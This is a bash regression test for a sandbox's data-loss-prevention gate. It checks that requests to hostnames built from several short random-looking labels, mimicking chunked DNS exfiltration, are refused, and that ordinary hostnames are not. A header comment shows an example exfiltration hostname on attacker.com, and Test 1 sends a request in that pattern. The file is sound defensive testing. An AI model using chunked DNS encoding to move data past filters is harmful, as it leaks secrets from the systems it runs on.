#!/usr/bin/env bash
# ============================================================================
# t_dlp_dns_chunked.sh — DLP catches chunked DNS exfiltration
#
# Regression for F2 (DLP plan): the original `dns_label_entropy` used a
# `len >= 8` floor with an absolute Shannon threshold. A 7-character
# base32 label maxes out at log2(7) ≈ 2.81 bits, well below the default
# 4.5 — so a chunked exfil `qx7vw2k.j9p3rmn.b8tczh4.attacker.com` slid
# past every label silently.
#
# The fix (R2) normalises each label's entropy against its per-length
# maximum and trips when two or more labels look random. This file pins
# the behaviour end-to-end:
#   - A request to a host whose subdomain consists of multiple short
#     high-entropy labels is refused at the DLP gate (451).
#   - A request to a normal-looking subdomain (`www.example.com`) is NOT
#     refused at the DLP gate. (It may still fail upstream — what matters
#     is that the verdict isn't `dns-entropy`.)
# ============================================================================

source "$(dirname "$0")/lib.sh"
require_user_namespaces
require_pasta
require_python3
header "DLP catches chunked-DNS exfil even with short labels"

CONFIG=$(tmpconfig <<'EOF'
[filesystem]
allow = ["/usr/lib", "/usr/bin", "/usr/local", "/lib", "/lib64", "/tmp"]

[network]
egress = "proxy-only"
# Wildcard via subdomain match: `example.com` accepts any *.example.com,
# letting us send the chunked subdomain through the policy gate so DLP
# gets a chance to see the host.
allow_domains = ["example.com"]

[process]
env_passthrough = ["PATH", "HOME", "LANG", "TERM"]

[syscalls]
EOF
)
_TMPFILES+=("$CONFIG")

PYTHON_GET='
import os, sys, urllib.request, urllib.error
url = sys.argv[1]
proxy = os.environ.get("HTTP_PROXY")
assert proxy, "HTTP_PROXY not set"
opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
req = urllib.request.Request(url)
try:
    resp = opener.open(req, timeout=5)
    print(f"OK status={resp.status}")
except urllib.error.HTTPError as e:
    err = e.headers.get("x-canister-error", "?")
    det = e.headers.get("x-canister-dlp-detector", "?")
    print(f"BLOCKED status={e.code} err={err} detector={det}")
except Exception as e:
    # Upstream connect failure (no DNS for the made-up subdomain) is
    # expected for the negative test — that is NOT a DLP block.
    print(f"NETERR error={e}")
'

# ---- Test 1: chunked exfil with 7-char labels → 451 dns-entropy ----
# Each label has 7 unique chars in 7 positions (normalised entropy 1.0).
# Three such labels in a row cross the "≥ 2 random labels" trigger.
begin_test "DLP blocks chunked DNS subdomain with 7-char high-entropy labels"
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_GET" "http://qx7vw2k.j9p3rmn.b8tczh4.example.com/"
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"detector=dns-entropy"*)
        pass
        ;;
    *)
        fail "expected 451 dns-entropy for chunked exfil; got: $RUN_STDOUT"
        ;;
esac

# ---- Test 2: a normal subdomain is NOT flagged ----
# `www.example.com` is a textbook DNS name; the DLP DNS check must let it
# through. (The upstream may still fail to respond — that's fine; what
# matters is the absence of `detector=dns-entropy`.)
begin_test "DLP does not false-positive on www.example.com"
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_GET" "http://www.example.com/"
case "$RUN_STDOUT" in
    *"detector=dns-entropy"*)
        fail "false-positive: www.example.com flagged as DNS exfil: $RUN_STDOUT"
        ;;
    *)
        pass
        ;;
esac

# ---- Test 3: a single high-entropy label is NOT enough to trip ----
# AWS hostnames like `i-0a3b8c9.compute.amazonaws.com` have one random-
# looking label. The redesigned heuristic requires ≥ 2 such labels per
# FQDN to flag, so a single suspicious label must pass.
begin_test "DLP does not false-positive on single high-entropy label"
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_GET" "http://i-0a3b8c9.compute.example.com/"
case "$RUN_STDOUT" in
    *"detector=dns-entropy"*)
        fail "false-positive: single high-entropy label flagged: $RUN_STDOUT"
        ;;
    *)
        pass
        ;;
esac

summary
